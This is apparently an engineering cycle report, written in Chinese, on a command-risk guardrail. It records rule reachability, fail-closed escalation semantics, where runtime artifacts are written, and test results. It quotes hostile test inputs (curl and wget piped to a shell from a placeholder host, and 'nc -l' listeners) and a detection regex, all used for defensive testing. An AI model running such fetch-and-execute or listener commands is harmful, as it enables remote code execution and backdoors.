# cycle-29 A · 护栏规则可达性 + 出口语义 + 运行产物收纳

- 日期：2026-10-25
- 来源：cycle-28 登记的三类未闭合项（`work_ooda/20261025-023500-cycle-28-A-guardian-gate/ISSUES.md`）＋跨空格路径同族边界 ＋ O-1/O-2/O-3/O-4/O-5 遗留登记
- 提交：cycle-29 A `c725c84`（+14 用例）／ B（architect-skills）TES-24 + DOC-15

## 1. 取证方式（先驱动，再结论）

不读注释，直接驱动护栏取真值：

| 命令 | `resolve_risk` | `assess` |
|---|---|---|
| `curl http://x | sh` | REVIEW（矩阵无 BLOCK 规则命中） | escalate 1.0 `curl/wget piped to shell` → deny |
| `echo hi | sh` | REVIEW | allow 0.0（无 curl/wget，扫描器不管） |
| `cat payload | bash` | REVIEW | allow 0.0（同上） |
| `wget http://x/a | python` | REVIEW | escalate 0.95 → deny |
| `curl http://x > f` | REVIEW | allow 0.0（无管道） |

结论方向：矩阵里的 `curl |` / `wget |` 对**真实流水线不可达**；管道进 shell 由 `_HIGH_RISK_PATTERNS` 兜底。

## 2. D-G3 残余 —— 为什么是「删」而不是「改成子串」

- `curl |` / `wget |` 是**固定宽度字面量**，真实命令是 `curl http://x | sh`：子串永不命中 ⇒ 该规则不是纵深防御，是装饰。
- 直觉修法（改成子串 `| sh`）在**子串引擎**里会误伤：`git log --oneline | shasum`、`ls | shuf`、`cat x | bashful_tool` 都会命中 ⇒ fail-closed 把正常工作拦掉。安全策略的误伤会诱导用户绕过门禁，比漏一条规则更危险。
- 管道进解释器是**正则形状**（`(curl|wget)\s+.*\|\s*(ba)?sh`），归 `risk_assessor._HIGH_RISK_PATTERNS` 所有：1.0 → escalate → deny，与 BLOCK 同效。
- 因此**删除**两个惰性字面量，并把「规则集 = 见证集」变成断言：`_REACHABLE_SHELL_RULES` 与矩阵键集必须逐字对齐；补一条命不中的规则即 FAIL。

## 3. 同族边界 —— 跨空格路径（显式登记，不修）

`_is_intermediate_path_segment` 以空格界定 token；`nc -l` 的**模式本身跨空格**，因此 `python bt.py --input E:/x/nc -l/y/in.json` 仍会被判为 `nc -l` 监听。唯一修法是把跨空格片段合并成「路径」，但这同时会放过真实的 `nc -l /tmp/sock`（Unix socket 监听，攻击面）。**开洞不是修复**，故登记为已知边界并加自证用例，写明取舍。

## 4. O-2 / O-1 —— 出口语义与退出码口径

- `escalate`：复核通道（`llm_review`）冻结为 `NotImplementedError`，故 escalate 与 deny 同效，属 fail-closed；本轮把语义写进代码注释并断言出口必带 `escalation_level`（human/llm），未来接复核通道时无需改分类器。
- `--once`：exit 0 = 轮次**跑完了**，1 = 轮次 error，2 = 锁/配置；「criteria 未达标」是数据（归档 verdict，`classify_stop`），不是 CLI 失败——否则 cron 会把正常结论当崩溃。口径写进 docstring 并加守护。

## 5. O-3 —— 运行产物越界（真缺陷）

- 证据：2026-10-25 全量压测 runtime root 指向 `<RUNTIME_ROOT>`，仓库 `projects/` 却残留 ~50 个任务目录（`t1base` / `t3n100` / `f9conc` / `subt` / `once-report-wb` …）。
- 根因：`run_reporter.run_base_dir()` 默认 `base_root = 仓根`；`run_state._claim_run_ts()` 调 `claim_run_ts()` 时未传 root；`report_util.write_customer_report()` 的 run_ts 分支也钉在 `project_root`。
- 对齐口径：`CLAUDE.md` §4「运行产物只写 runtime.root」；§9.4「客户报告落项目规约目录 `projects/<domain>/<task>/reports/<date>/`」。
- 修法：新增 `RunReporter._tree_root()`（= `runtime.root`，缺省回退仓根），`_run_data_dir` / `write_customer_report(runs_root=...)` / `_claim_run_ts(root=...)` 三处共用；`reports/` 分支不动。
- 自证：归档树与每次运行报告都必须落在 `runtime.root` 之下且**不得**在仓库生成同名任务目录；无 `runtime:` 段时 `_tree_root() == 仓根`（旧布局零变化）。

## 6. O-5 —— 锁路径（D-S1 家族守卫）

D-S1 的教训是「探针把锁路径写成 `<repo>/sloth_engine/.loop.lock`，于是 I4 不变量成了空断言」。本轮把锁路径变成**行为面**断言：用真 `CliRouter` + 真 `_RunLock` 分别驱动 `--once` 与长跑入口，两次捕获的路径都必须等于 `<runtime.root>/.loop.lock`；再加一条源码单形状断言（该表达式只出现一次写法），任何 agent 都拿不到第二条错路径。

## 7. 验收

- `pytest tests sloth_engine/tests -q` → 1682 passed / 1 xfailed / **79.11%**
- `scripts/run_gate.py --all` → PASS（baseline-vs-measured / docs-baseline / orphan-mechanisms）
- `docs_baseline.check() == []`；`tests/test_wake_pointer_chain.py` 全绿
- B 侧：`node scripts/validate-contracts.mjs` → 19 atom / 0 错 / 0 警；`node tests/run-l1-tests.mjs` → 32 passed；跨仓账本 `unexplained 0 / exit 0`

## 8. 冻结项（不动）

N-3 / R3（真实额度源、真实模型 24h soak）；coze I-1/I-3/I-4、cycle-12 条目 11/12/13；WebUI / 每项目文件沙箱；`guardian/risk_assessor.py::llm_review()`（保持 `NotImplementedError`）。
